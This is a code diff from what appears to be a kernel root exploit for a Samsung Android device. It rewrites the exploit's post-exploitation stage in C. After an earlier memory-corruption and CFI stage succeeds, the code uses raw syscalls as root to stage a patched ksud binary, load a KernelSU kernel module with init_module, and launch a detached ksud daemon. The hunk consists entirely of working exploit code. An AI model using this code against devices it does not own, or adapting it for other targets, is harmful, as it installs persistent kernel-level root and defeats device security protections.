@@ -613,94 +613,73 @@ int run_exploit(int argc, char **argv) {
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
       if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
-    pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
-               keeper);
+    pr_success("stability keeper pid=%d\n", keeper);
 
-    /* Stage files for KernelSU using raw syscalls (libc heap may be corrupted) */
-    pr_success("staging KernelSU files via raw syscalls\n");
-
-    /* Copy kallsyms */
-    int fd_src = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/kallsyms.txt", O_RDONLY, 0);
+    /* Stage ksud at the path the Samsung module expects */
+    int fd_src = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud-patched", O_RDONLY, 0);
     if (fd_src >= 0) {
-      int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/adb/ksym",
-                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
-      if (fd_dst >= 0) {
-        char buf[4096];
-        ssize_t n;
-        while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
-          ssize_t written = 0;
-          while (written < n) {
-            ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
-            if (w < 0) break;
-            written += w;
-          }
+        /* Use .ksud-stage as temp name, then rename to ksud on same fs */
+        int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/.ksud-stage",
+                             O_WRONLY | O_CREAT | O_TRUNC, 0755);
+        if (fd_dst >= 0) {
+            char buf[4096];
+            ssize_t n;
+            while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
+                ssize_t written = 0;
+                while (written < n) {
+                    ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
+                    if (w < 0) break;
+                    written += w;
+                }
+            }
+            syscall(SYS_close, fd_dst);
+            
+            /* Rename on same filesystem - atomic */
+            syscall(SYS_renameat, AT_FDCWD, "/data/local/tmp/.ksud-stage",
+                    AT_FDCWD, "/data/local/tmp/ksud");
+            pr_success("staged /data/local/tmp/ksud\n");
         }
-        syscall(SYS_close, fd_dst);
-        pr_success("staged /data/adb/ksym\n");
-      }
-      syscall(SYS_close, fd_src);
+        syscall(SYS_close, fd_src);
     }
 
-    /* Copy patched ksud */
-    fd_src = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud-patched", O_RDONLY, 0);
-    if (fd_src >= 0) {
-      int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud",
-                           O_WRONLY | O_CREAT | O_TRUNC, 0755);
-      if (fd_dst >= 0) {
-        char buf[4096];
-        ssize_t n;
-        while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
-          ssize_t written = 0;
-          while (written < n) {
-            ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
-            if (w < 0) break;
-            written += w;
-          }
-        }
-        syscall(SYS_close, fd_dst);
-        pr_success("staged /data/local/tmp/ksud\n");
-      }
-      syscall(SYS_close, fd_src);
-    }
-
-    /* Copy KernelSU module */
+    /* Load the KernelSU module directly from THIS root process */
     fd_src = syscall(SYS_openat, AT_FDCWD,
-                     "/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
-                     O_RDONLY, 0);
+        "/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
+        O_RDONLY, 0);
     if (fd_src >= 0) {
-      int fd_dst = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/kernelsu.ko",
-                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
-      if (fd_dst >= 0) {
-        char buf[4096];
-        ssize_t n;
-        while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
-          ssize_t written = 0;
-          while (written < n) {
-            ssize_t w = syscall(SYS_write, fd_dst, buf + written, n - written);
-            if (w < 0) break;
-            written += w;
-          }
+        /* init_module from the root exploit process */
+        int ret = syscall(SYS_init_module, fd_src, "", NULL);
+        pr_success("init_module ret=%d errno=%d\n", ret, errno);
+        syscall(SYS_close, fd_src);
+        
+        if (ret == 0) {
+            /* Module loaded successfully - now start the daemon */
+            pid_t daemon_pid = fork();
+            if (daemon_pid == 0) {
+                setsid();
+                /* Redirect stdout/stderr to a log file so we can see daemon errors */
+                int log_fd = syscall(SYS_openat, AT_FDCWD, "/data/local/tmp/ksud.log",
+                                     O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                if (log_fd >= 0) {
+                    syscall(SYS_dup2, log_fd, 1);
+                    syscall(SYS_dup2, log_fd, 2);
+                    syscall(SYS_close, log_fd);
+                }
+                
+                char *args[] = {"/data/local/tmp/ksud", "daemon", NULL};
+                char *envp[] = {NULL};
+                syscall(SYS_execve, "/data/local/tmp/ksud", args, envp);
+                pr_error("execve ksud failed errno=%d\n", errno);
+                syscall(SYS_exit, 1);
+            } else if (daemon_pid > 0) {
+                pr_success("ksud daemon pid=%d\n", daemon_pid);
+            }
+        } else {
+            pr_error("init_module failed ret=%d errno=%d\n", ret, errno);
         }
-        syscall(SYS_close, fd_dst);
-        pr_success("staged /data/local/tmp/kernelsu.ko\n");
-      }
-      syscall(SYS_close, fd_src);
+    } else {
+        pr_error("failed to open .ko errno=%d\n", errno);
     }
-
-    /* Launch ksud daemon */
-    pid_t daemon_pid = fork();
-    if (daemon_pid == 0) {
-      setsid();
-      syscall(SYS_close, 0);
-      syscall(SYS_close, 1);
-      syscall(SYS_close, 2);
-      char *argv[] = {"/data/local/tmp/ksud", "daemon", NULL};
-      char *envp[] = {NULL};
-      syscall(SYS_execve, "/data/local/tmp/ksud", argv, envp);
-      syscall(SYS_exit, 1);
-    } else if (daemon_pid > 0) {
-      pr_success("ksud daemon pid=%d\n", daemon_pid);
-    }
-  }
+}
   return exploit_ok ? 0 : 1;
 }
